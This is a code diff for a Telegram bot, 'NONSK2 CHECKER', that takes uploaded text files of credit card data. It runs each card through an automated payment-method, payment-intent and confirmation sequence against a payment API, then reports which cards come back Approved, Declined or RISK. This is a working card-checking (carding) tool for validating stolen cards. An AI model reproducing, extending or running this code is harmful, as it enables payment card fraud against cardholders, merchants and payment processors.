@@ -7,59 +7,72 @@ import string
 import urllib3
 from telebot import types
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+approved = []
+declined = []
+risk = []
+
 def process_nonsk2_command(bot, message):
-    chat_id = message.chat.id
-    bot.send_message(chat_id, "Please send your txt file with CC data.")
+    bot.send_message(message.chat.id, "Please send your txt file with CC data.")
 
-def handle_document(bot, message):
-    chat_id = message.chat.id
-    file_info = bot.get_file(message.document.file_id)
-    downloaded_file = bot.download_file(file_info.file_path)
+def handle_docs(bot, message):
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
 
-    cc_data = downloaded_file.decode('utf-8').split('\n')
-    cc_data = [cc.strip() for cc in cc_data if cc.strip()]
+        with open('cc_data.txt', 'wb') as new_file:
+            new_file.write(downloaded_file)
 
-    total_cards = len(cc_data)
-    approved = []
-    declined = []
-    risk = []
-    start_time = time.time()
+        with open('cc_data.txt', 'r') as file:
+            cc_list = file.readlines()
 
-    initial_message = "↯ NONSK2 CHECKER\n\n"
-    msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))
+        total_cards = len(cc_list)
+        start_time = time.time()
 
-    keyboard = types.InlineKeyboardMarkup()
-    keyboard.add(
-        types.InlineKeyboardButton(f"Approved ✅: [0]", callback_data='approved'),
-        types.InlineKeyboardButton(f"Declined ❌: [0]", callback_data='declined'),
-        types.InlineKeyboardButton(f"RISK 📝: [0]", callback_data='risk'),
-        types.InlineKeyboardButton(f"TOTAL: [{total_cards}]", callback_data='total')
-    )
+        for cc in cc_list:
+            result = check_nonsk2_card(cc.strip())
+            if "Approved" in result:
+                approved.append((cc.strip(), result))
+            elif "Declined" in result:
+                declined.append((cc.strip(), result))
+            elif "RISK" in result:
+                risk.append((cc.strip(), result))
 
-    for index, cc in enumerate(cc_data):
-        result = check_nonsk2_card(cc)
-        if 'Approved' in result:
-            approved.append((cc, result))
-        elif 'RISK' in result:
-            risk.append((cc, result))
-        else:
-            declined.append((cc, result))
+            bot.send_message(message.chat.id, f"Checking your card... ⏳💵\n• {cc.strip()} •")
 
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=msg.message_id,
-            text=initial_message + f"• {cc} •\n" + get_footer_info(total_cards, start_time, message.from_user.username),
-            reply_markup=keyboard
+        bot.send_message(
+            message.chat.id,
+            f"↯ NONSK2 CHECKER\n\n• Approved ✅: [{len(approved)}] •\n• Declined ❌: [{len(declined)}] •\n• RISK 📝: [{len(risk)}] •\n• TOTAL: [{total_cards}] •"
         )
-        keyboard = types.InlineKeyboardMarkup()
+
+        # Creating inline keyboard for showing results
+        keyboard = types.InlineKeyboardMarkup(row_width=1)
         keyboard.add(
-            types.InlineKeyboardButton(f"Approved ✅: [{len(approved)}]", callback_data='approved'),
-            types.InlineKeyboardButton(f"Declined ❌: [{len(declined)}]", callback_data='declined'),
-            types.InlineKeyboardButton(f"RISK 📝: [{len(risk)}]", callback_data='risk'),
-            types.InlineKeyboardButton(f"TOTAL: [{total_cards}]", callback_data='total')
+            types.InlineKeyboardButton(text="Approved ✅", callback_data='approved'),
+            types.InlineKeyboardButton(text="Declined ❌", callback_data='declined'),
+            types.InlineKeyboardButton(text="RISK 📝", callback_data='risk')
         )
 
-    bot.send_message(chat_id, "Checking completed!")
+        bot.send_message(message.chat.id, "Choose an option:", reply_markup=keyboard)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
+
+def handle_callback_query(call, bot):
+    if call.data == 'approved':
+        send_cards(call.message.chat.id, approved, bot, "Approved ✅ Cards")
+    elif call.data == 'declined':
+        send_cards(call.message.chat.id, declined, bot, "Declined ❌ Cards")
+    elif call.data == 'risk':
+        send_cards(call.message.chat.id, risk, bot, "RISK 📝 Cards")
+
+def send_cards(chat_id, cards, bot, title):
+    if cards:
+        card_list = "\n".join([f"CC: {cc}\nResult => {result}" for cc, result in cards])
+        bot.send_message(chat_id, f"{title}\n\n{card_list}")
+    else:
+        bot.send_message(chat_id, f"No {title} found.")
 
 def check_nonsk2_card(cc):
     try:
@@ -69,7 +82,6 @@ def check_nonsk2_card(cc):
 
     session = requests.Session()
     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     headers = {
         "User-Agent": user_agent,
@@ -105,7 +117,7 @@ def check_nonsk2_card(cc):
     payment_method_id = response_data.get('id')
 
     if not payment_method_id:
-        return f"Failed to create payment method❌: {response_data.get('error', {}).get('message', 'Unknown error')}"
+        return "Failed to create payment method❌"
 
     # Step 3: Get Payment Intent
     payment_intent_data = {
@@ -123,7 +135,7 @@ def check_nonsk2_card(cc):
     client_secret = response_data.get('clientSecret')
 
     if not payment_intent_id or not client_secret:
-        return f"Failed to get payment intent❌: {response_data.get('error', {}).get('message', 'Unknown error')}"
+        return "Failed to get payment intent❌"
 
     # Step 4: Confirm Payment Intent
     confirm_payment_data = {
@@ -150,11 +162,8 @@ def check_nonsk2_card(cc):
         return "3DSECURE"
     elif "rate_limit" in response_data.get("error", {}).get("decline_code", ""):
         return "RATE LIMIT"
-    elif "security code (CVC) for this card" in response_data.get("error", {}).get("message", ""):
-        return "Missing CVC"
     else:
-        error_message = response_data.get('error', {}).get('message', 'Unknown error')
-        return f"Declined: {error_message}"
+        return "Declined"
 
 def random_string():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
@@ -173,18 +182,3 @@ def get_footer_info(total_cards, start_time, username):
         f"－－－－－－－－－－－－－－－－"
     )
     return footer
-
-def handle_callback_query(call, bot, approved, declined, risk):
-    if call.data == 'approved':
-        send_cards(call.message.chat.id, approved, bot, "Approved ✅ Cards")
-    elif call.data == 'declined':
-        send_cards(call.message.chat.id, declined, bot, "Declined ❌ Cards")
-    elif call.data == 'risk':
-        send_cards(call.message.chat.id, risk, bot, "RISK 📝 Cards")
-
-def send_cards(chat_id, cards, bot, title):
-    if cards:
-        card_list = "\n".join([f"CC: {cc}\nResult => {result}" for cc, result in cards])
-        bot.send_message(chat_id, f"{title}\n\n{card_list}")
-    else:
-        bot.send_message(chat_id, f"No {title} found.")
